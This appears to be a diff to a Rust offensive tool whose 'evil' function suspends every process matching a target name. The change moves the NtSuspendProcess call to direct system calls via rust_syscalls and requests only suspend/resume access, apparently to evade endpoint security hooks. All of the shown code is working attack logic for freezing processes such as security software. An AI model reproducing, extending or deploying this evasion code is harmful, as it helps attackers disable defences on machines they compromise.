@@ -1,13 +1,14 @@
 use colored::Colorize;
-use ntapi::ntpsapi::NtSuspendProcess;
+use rust_syscalls::syscall;
 use std::env;
+use std::ffi::c_void;
 use std::mem::transmute;
 use sysinfo::PidExt;
 use sysinfo::ProcessExt;
 use sysinfo::SystemExt;
 use windows::Win32::{
     Foundation::HANDLE,
-    System::Threading::{OpenProcess, PROCESS_ALL_ACCESS},
+    System::Threading::{OpenProcess, PROCESS_SUSPEND_RESUME},
 };
 
 fn evil(target: &str) {
@@ -18,7 +19,7 @@ fn evil(target: &str) {
         let pid: u32 = p.pid().as_u32();
         unsafe {
             let res_handle = OpenProcess(
-                PROCESS_ALL_ACCESS,
+                PROCESS_SUSPEND_RESUME,
                 windows::Win32::Foundation::BOOL::from(false),
                 pid,
             );
@@ -38,9 +39,9 @@ fn evil(target: &str) {
                 }
             };
 
-            let c_handle = transmute(handle);
+            let c_handle: *mut c_void = transmute(handle);
 
-            let ntstatus = NtSuspendProcess(c_handle);
+            let ntstatus = syscall!("NtSuspendProcess", c_handle);
 
             match ntstatus {
                 0 => {
@@ -52,6 +53,8 @@ fn evil(target: &str) {
                     println!("{}", message);
                 }
             }
+
+            let _ = syscall!("NtClose", handle);
         }
     }
 }
